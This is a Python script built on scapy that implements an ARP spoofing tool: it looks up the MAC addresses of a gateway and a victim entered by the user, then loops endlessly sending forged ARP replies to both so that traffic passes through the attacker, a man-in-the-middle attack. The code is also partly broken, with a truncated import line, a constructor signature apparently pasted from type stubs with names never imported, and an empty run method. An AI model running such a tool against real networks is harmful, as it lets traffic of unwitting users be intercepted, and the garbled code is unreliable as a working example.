import random
from datetime import datetime
from scapy.all import *
from scapy.layers.l2 import ARP,Ether
from threading import Thread
from m
from sniffer import packet_sniffer

class Spoofer(Thread):
    def __init__(self, ifname=conf.iface.name, mac=None, group: None = ..., target: Callable[..., Any] | None = ..., name: str | None = ..., args: Iterable[Any] = ..., kwargs: Mapping[str, Any] | None = ..., *, daemon: bool | None = ...) -> None:
        super().__init__(group, target, name, args, kwargs, daemon=daemon)
        print("\t[*] Initailizing spoofer")
        self.inface = conf.iface
        print(f"\t[+] set iface to {ifname}")
        
        if mac is None:
            mac = self.genrate_mac()
            print("\t[Info] no mac given - genearting mac")
        print(f"\t[+] set spoofer mac to {mac}")
        self.mac = mac
        # create a packet sniffer with "arp" filter 
        self.sniffer = packet_sniffer(filter="arp", iface_name=ifname)
        print("\t[]")
        print("\t[Info] finished initialzing spoofer")

    def get_mac(self,ip,timeout=5):
        # create arp request frame with setted params
        frame = Ether(dst ="ff:ff:ff:ff:ff:ff")/ARP(pdst = ip)
        answer = srp(frame, timeout, iface=self.inface, verbose=False)[0] # srp returns a tuple of (answered , unanswered), take only the answers at [0]
        return answer[0][1].hwsrc
        # answer type is plist.SndRcvList
        # answer[0] turns it to plist.QueryAnswer ([0] - query , [1] - answer)
        # from answer[0][1] get hwsrc - mac of requested ip 
    
    @staticmethod
    def genrate_mac():
        return ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
    
    def spoof(self, target_ip, target_mac, spoofed_ip):
        # create "is-at" response frame 
        frame = Ether(src = self.mac , dst = target_mac)/ARP(op=2, psrc = spoofed_ip , pdst = target_ip, hwsrc = self.mac ,hwdst = target_mac)
        print(f"\t[!] tell {target_ip}:{target_mac} that {spoofed_ip} is at {self.mac}")
        sendp(frame, verbose=False)

    def run(self):
        print("[Warning] about to activly send trafic")


        
        
def main():
    try:
        gw_ip = input("insert gateway ip: ")
        victim_ip  = input("insert victims ip: ")

        print ("L2 spoofer:")
        print(f"[Info] {datetime.now()} - creating spoofer")
        spoofer = Spoofer()
        print("[Info] l2 spoofer is ready")
        print("[Warning] about to activly send trafic")

        gw_mac = spoofer.get_mac(gw_ip)
        victim_mac = spoofer.get_mac(victim_ip)

        while True:
            # tell the victim that that the spoofer is the gw
            spoofer.spoof(victim_ip , victim_mac, gw_ip)
            # tell the gw that the spoofer is the victim 
            spoofer.spoof(gw_ip , gw_mac, victim_ip )
    
    except KeyboardInterrupt:
        print(f"\n[Info] {datetime.now()} - stop spoofer")


if __name__ == "__main__": 
    main()

